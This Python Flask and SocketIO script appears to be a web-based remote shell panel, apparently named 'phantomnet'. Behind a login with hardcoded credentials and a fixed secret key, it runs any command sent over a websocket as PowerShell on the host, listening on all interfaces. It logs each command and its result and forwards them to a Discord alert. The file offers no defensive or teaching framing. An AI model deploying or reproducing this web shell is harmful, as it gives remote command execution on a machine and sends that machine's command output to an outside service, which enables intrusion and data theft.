from discord_alert import send_alert
from flask import Flask, request, redirect, render_template_string, session
from flask_socketio import SocketIO, send
import subprocess

app = Flask(__name__)
app.config['SECRET_KEY'] = 'phantomnet123'
socketio = SocketIO(app)

USERNAME = "admin"
PASSWORD = "kingmode"

with open("dashboard.html", "r") as f:
    dashboard_html = f.read()
with open("login.html", "r") as f:
    login_html = f.read()

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        if request.form.get("user") == USERNAME and request.form.get("pass") == PASSWORD:
            session["logged_in"] = True
            return redirect("/dashboard")
        else:
            return "Access Denied", 401
    return render_template_string(login_html)

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect("/")
    return render_template_string(dashboard_html)

@socketio.on("message")
def handle_socket(cmd):
    if not session.get("logged_in"):
        return
    try:
        output = subprocess.check_output(["powershell", "-Command", cmd], stderr=subprocess.STDOUT, text=True)
    except subprocess.CalledProcessError as e:
        output = e.output

    # Save to log file
    with open("output.log", "a", encoding="utf-8") as log:
        log.write(f">>> {cmd}\n{output}\n")

    # Send to UI
    send(output)

    # Send Discord Alert (shortened to 500 chars)
    send_alert(f"CMD: {cmd}\nRESULT:\n{output[:500]}")

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8080)
